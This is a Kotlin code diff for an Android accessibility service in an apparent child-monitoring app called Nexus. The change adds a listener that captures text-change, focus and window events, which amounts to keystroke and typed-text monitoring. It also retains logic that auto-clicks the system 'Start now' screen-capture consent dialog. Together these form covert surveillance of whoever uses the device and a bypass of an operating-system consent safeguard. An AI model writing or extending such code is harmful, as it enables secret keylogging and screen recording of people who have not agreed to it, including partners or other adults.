@@ -19,11 +19,32 @@ import com.nexus.child.service.NexusBackgroundService
  */
 class NexusAccessibilityService : AccessibilityService() {
 
+    /**
+     * Listener interface for components interested in text input, keystrokes, and focus events.
+     */
+    interface IAccessibilityKeyboardListener {
+        /**
+         * Invoked on the main thread when an accessibility event matching text change, focus, or window state occurs.
+         */
+        fun onKeyboardAccessibilityEvent(event: AccessibilityEvent)
+    }
+
     companion object {
         private const val TAG = "NexusAccessibility"
 
         @Volatile
         private var instance: NexusAccessibilityService? = null
+
+        @Volatile
+        private var keyboardListener: IAccessibilityKeyboardListener? = null
+
+        /**
+         * Registers or unregisters the active keyboard event listener.
+         */
+        fun setKeyboardEventListener(listener: IAccessibilityKeyboardListener?) {
+            keyboardListener = listener
+            Log.d(TAG, "Keyboard event listener " + if (listener != null) "attached" else "detached")
+        }
 
         /**
          * Returns true if the service is currently bound and connected by Android OS.
@@ -53,20 +74,34 @@ class NexusAccessibilityService : AccessibilityService() {
 
         if (event == null) return
 
-        // Only process events when MediaProjection auto-click is actively armed
-        if (!MediaProjectionAutoClickHelper.isAutoClickEnabled()) {
-            return
+        // 1. Dispatch keyboard monitoring events if an active keyboard listener is attached
+        keyboardListener?.let { listener ->
+            try {
+                val type = event.eventType
+                if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
+                    type == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+                    type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                ) {
+                    listener.onKeyboardAccessibilityEvent(event)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error dispatching accessibility event to keyboard listener: ${e.message}", e)
+            }
         }
 
-        try {
-            val type = event.eventType
-            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-                type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                val rootNode = event.source ?: rootInActiveWindow
-                MediaProjectionAutoClickHelper.tryAutoClick(rootNode, this)
+        // 2. MediaProjection auto-click handling (intercept "Start now" system dialog)
+        if (MediaProjectionAutoClickHelper.isAutoClickEnabled()) {
+            try {
+                val type = event.eventType
+                if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                    type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                ) {
+                    val rootNode = event.source ?: rootInActiveWindow
+                    MediaProjectionAutoClickHelper.tryAutoClick(rootNode, this)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error handling accessibility event for MediaProjection: ${e.message}", e)
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error handling accessibility event: ${e.message}", e)
         }
     }
 
